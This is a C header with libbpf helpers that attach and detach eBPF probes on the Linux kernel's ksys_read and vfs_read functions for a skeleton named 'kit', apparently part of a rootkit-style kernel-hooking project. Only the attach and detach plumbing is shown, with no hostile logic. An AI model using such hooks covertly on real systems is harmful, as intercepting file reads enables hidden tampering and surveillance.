#ifndef __MOD_FS_H
#define __MOD_FS_H

#include <linux/bpf.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "common.h"
#include "kit.skel.h"

//Connections
int attach_kprobe_ksys_read(struct kit_bpf *skel){
    skel->links.kprobe_ksys_read = bpf_program__attach(skel->progs.kprobe_ksys_read);
	return libbpf_get_error(skel->links.kprobe_ksys_read);
}
int attach_kretprobe_vfs_read(struct kit_bpf *skel){
    skel->links.kretprobe_vfs_read = bpf_program__attach(skel->progs.kretprobe_vfs_read);
	return libbpf_get_error(skel->links.kretprobe_vfs_read);
}

int attach_fs_all(struct kit_bpf *skel){
    return attach_kprobe_ksys_read(skel) || attach_kretprobe_vfs_read(skel);
}


int detach_kprobe_ksys_read(struct kit_bpf *skel){
    int err = detach_link_generic(skel->links.kprobe_ksys_read);
    if(err<0){
        fprintf(stderr, "Failed to detach fs link\n");
        return -1;
    }
    return 0;
}
int detach_kretprobe_vfs_read(struct kit_bpf *skel){
    int err = detach_link_generic(skel->links.kretprobe_vfs_read);
    if(err<0){
        fprintf(stderr, "Failed to detach fs link\n");
        return -1;
    }
    return 0;
}

int detach_fs_all(struct kit_bpf *skel){
    return detach_kprobe_ksys_read(skel) || detach_kretprobe_vfs_read(skel);
}

#endif